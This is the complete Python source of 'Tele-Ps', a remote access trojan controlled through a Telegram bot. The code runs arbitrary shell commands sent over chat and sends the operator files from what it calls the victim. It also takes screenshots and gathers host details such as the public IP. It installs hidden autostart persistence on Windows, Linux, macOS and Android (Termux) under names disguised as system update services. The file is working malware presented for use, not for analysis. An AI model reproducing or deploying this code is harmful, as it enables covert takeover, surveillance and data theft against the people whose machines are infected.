#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#   Tele-Ps - Telegram-controlled agent
#   C2 channel : Telegram Bot API (long polling)
#   No IP / domain required - fully chat-driven
#   Works on: Windows / Linux / macOS / Android (Termux)
#   Made by Abdelrahman
# ============================================================

import os
import platform
import shutil
import socket
import subprocess
import sys
import time

try:
    import requests
except ImportError:
    sys.stderr.write("[-] Tele-Ps requires 'requests' -> pip install -r requirements.txt\n")
    sys.exit(1)

BOT_TOKEN = "%%BOT_TOKEN%%"
CHAT_ID = "%%CHAT_ID%%"

API_URL = "https://api.telegram.org/bot" + BOT_TOKEN
FILE_URL = "https://api.telegram.org/file/bot" + BOT_TOKEN
SELF = os.path.abspath(__file__)
CWD = os.path.expanduser("~")

IS_TERMUX = ("com.termux" in os.environ.get("HOME", "") or
             os.path.exists("/data/data/com.termux/files/usr/bin/bash"))

HELP = (
    "Tele-Ps agent online  |  Made by Abdelrahman\n"
    "\n"
    "Commands:\n"
    "  /help | /start      show this menu\n"
    "  /sysinfo            system information\n"
    "  /shot               take a screenshot\n"
    "  /download <path>    pull a file from the victim\n"
    "  /persist            install persistence (autostart)\n"
    "  /kill               stop the agent\n"
    "\n"
    "Send a document to the bot -> saved on the victim\n"
    "Any other text is executed as a shell command\n"
    "\n"
    "Platform: " + ("Android (Termux)" if IS_TERMUX else platform.system())
)


def tg(method, **params):
    try:
        r = requests.post(API_URL + "/" + method, data=params, timeout=45)
        return r.json()
    except Exception:
        return {"ok": False}


def send_text(text):
    text = str(text)
    for i in range(0, len(text), 3900):
        tg("sendMessage", chat_id=CHAT_ID, text=text[i:i + 3900])
        time.sleep(0.4)


def send_file(path):
    if not os.path.isfile(path):
        send_text("[-] File not found: " + path)
        return
    try:
        with open(path, "rb") as fh:
            r = requests.post(
                API_URL + "/sendDocument",
                data={"chat_id": CHAT_ID},
                files={"document": (os.path.basename(path), fh)},
                timeout=180,
            )
        ok = r.json().get("ok")
        send_text("[+] Sent '%s'  (ok=%s)" % (path, ok))
    except Exception as e:
        send_text("[-] Send failed: " + str(e))


def recv_file(file_id, name):
    try:
        j = tg("getFile", file_id=file_id)
        fpath = j["result"]["file_path"]
        data = requests.get(FILE_URL + "/" + fpath, timeout=180).content
        with open(name, "wb") as fh:
            fh.write(data)
        return "saved '%s' (%d bytes)" % (name, len(data))
    except Exception as e:
        return "failed: " + str(e)


def run_cmd(cmd):
    global CWD
    cmd = cmd.strip()
    low = cmd.lower()
    if low.startswith("cd "):
        try:
            os.chdir(cmd[3:].strip())
            CWD = os.getcwd()
            return "[+] CWD: " + CWD
        except Exception as e:
            return "[-] " + str(e)
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=120, cwd=CWD)
        out = (p.stdout or "") + (p.stderr or "")
        return out.strip() or "[+] Done (no output)"
    except subprocess.TimeoutExpired:
        return "[-] Command timed out after 120s"
    except Exception as e:
        return "[-] Error: " + str(e)


def termux_prop(name):
    try:
        p = subprocess.run(["getprop", name], capture_output=True, text=True, timeout=8)
        v = p.stdout.strip()
        return v or "n/a"
    except Exception:
        return "n/a"


def sysinfo():
    try:
        pub_ip = requests.get("https://api.ipify.org", timeout=8).text.strip()
    except Exception:
        pub_ip = "n/a"
    lines = [
        "== System Info ==",
        "Hostname : " + socket.gethostname(),
        "User     : " + (os.getenv("USERNAME") or os.getenv("USER") or "n/a"),
        "OS       : " + platform.platform(),
        "Arch     : " + platform.machine(),
        "Python   : " + sys.version.split()[0],
        "Public IP: " + pub_ip,
        "CWD      : " + CWD,
        "Agent    : " + SELF,
    ]
    if IS_TERMUX:
        lines.append("Termux   : yes")
        lines.append("Device   : " + termux_prop("ro.product.model"))
        lines.append("Android  : " + termux_prop("ro.build.version.release"))
    return "\n".join(lines)


def screenshot():
    if IS_TERMUX:
        if not shutil.which("termux-screenshot"):
            send_text("[-] Install termux-api:  pkg install termux-api  (then termux-screenshot)")
            return
        try:
            import tempfile
            fd, path = tempfile.mkstemp(suffix=".png")
            os.close(fd)
            os.remove(path)
            subprocess.run(["termux-screenshot", "-o", path],
                           capture_output=True, timeout=20)
            if os.path.isfile(path):
                send_file(path)
                os.remove(path)
            else:
                send_text("[-] Screenshot failed (no termux-api permission?)")
        except Exception as e:
            send_text("[-] Screenshot failed: " + str(e))
        return
    try:
        from mss import mss as _mss
        from mss.tools import to_png as _to_png
    except ImportError:
        send_text("[-] Screenshot needs 'mss' -> pip install mss")
        return
    try:
        import tempfile
        fd, path = tempfile.mkstemp(suffix=".png")
        os.close(fd)
        with _mss() as sct:
            img = sct.grab(sct.monitors[0])
            _to_png(img.rgb, img.size, output=path)
        send_file(path)
        os.remove(path)
    except Exception as e:
        send_text("[-] Screenshot failed: " + str(e))


def persist():
    system = platform.system()
    try:
        if IS_TERMUX:
            boot_dir = os.path.expanduser("~/.termux/boot")
            os.makedirs(boot_dir, exist_ok=True)
            sh = os.path.join(boot_dir, "tele-ps.sh")
            with open(sh, "w") as fh:
                fh.write("#!/data/data/com.termux/files/usr/bin/bash\n"
                         "nohup %s %s > /dev/null 2>&1 &\n" % (sys.executable, SELF))
            os.chmod(sh, 0o700)
            bashrc = os.path.expanduser("~/.bashrc")
            hook = "nohup %s %s > /dev/null 2>&1 &" % (sys.executable, SELF)
            with open(bashrc, "a") as fh:
                if hook not in open(bashrc).read():
                    fh.write("\n# tele-ps autostart (Made by Abdelrahman)\n%s\n" % hook)
            return ("[+] Termux persistence:\n"
                    "    1) ~/.termux/boot/tele-ps.sh   (needs Termux:Boot app)\n"
                    "    2) ~/.bashrc hook          (starts on every new session)")
        if system == "Windows":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateSvc", 0, winreg.REG_SZ,
                              '"%s" "%s"' % (sys.executable, SELF))
            winreg.CloseKey(key)
            return "[+] Persistence: HKCU\\...\\Run -> WindowsUpdateSvc"
        if system == "Linux":
            d = os.path.expanduser("~/.config/autostart")
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "tele-ps.desktop"), "w") as fh:
                fh.write("[Desktop Entry]\nType=Application\nName=Tele-Ps\n"
                         "Exec=%s %s\nX-GNOME-Autostart-enabled=true\n"
                         % (sys.executable, SELF))
            return "[+] Persistence: ~/.config/autostart/tele-ps.desktop"
        if system == "Darwin":
            d = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(d, exist_ok=True)
            plist = os.path.join(d, "com.apple.updates.plist")
            with open(plist, "w") as fh:
                fh.write('<?xml version="1.0" encoding="UTF-8"?>\n'
                         '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                         '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
                         '<plist version="1.0"><dict>\n'
                         '<key>Label</key><string>com.apple.updates</string>\n'
                         '<key>ProgramArguments</key>\n'
                         '<array><string>%s</string><string>%s</string></array>\n'
                         '<key>RunAtLoad</key><true/>\n'
                         '</dict></plist>\n' % (sys.executable, SELF))
            return "[+] Persistence: LaunchAgent com.apple.updates"
        return "[-] Unsupported OS: " + system
    except Exception as e:
        return "[-] Persistence failed: " + str(e)


def handle(msg):
    text = (msg.get("text") or "").strip()
    doc = msg.get("document")
    if doc:
        name = doc.get("file_name") or "incoming_file"
        send_text("[+] Incoming document: " + name)
        send_text("[+] " + recv_file(doc["file_id"], name))
        return
    if not text:
        return
    low = text.lower()
    if low in ("/help", "/start"):
        send_text(HELP)
    elif low == "/sysinfo":
        send_text(sysinfo())
    elif low in ("/shot", "/screenshot"):
        screenshot()
    elif low == "/persist":
        send_text(persist())
    elif low.startswith("/download "):
        p = text.split(None, 1)[1].strip()
        if not os.path.isabs(p):
            p = os.path.join(CWD, p)
        send_file(p)
    elif low == "/kill":
        send_text("[+] Agent stopped. Made by Abdelrahman")
        sys.exit(0)
    else:
        send_text(run_cmd(text))


def main():
    send_text("[+] %s connected (%s) | Made by Abdelrahman" %
              (socket.gethostname(), "Termux" if IS_TERMUX else platform.system()))
    offset = 0
    while True:
        try:
            r = requests.get(API_URL + "/getUpdates",
                             params={"offset": offset + 1, "timeout": 50},
                             timeout=60)
            data = r.json()
            if not data.get("ok"):
                time.sleep(5)
                continue
            for upd in data.get("result", []):
                offset = upd["update_id"]
                msg = upd.get("message") or upd.get("channel_post") or {}
                if str(msg.get("chat", {}).get("id")) == str(CHAT_ID):
                    handle(msg)
        except requests.exceptions.RequestException:
            time.sleep(10)
        except Exception:
            time.sleep(10)


if __name__ == "__main__":
    while True:
        try:
            main()
        except SystemExit:
            raise
        except Exception:
            time.sleep(10)
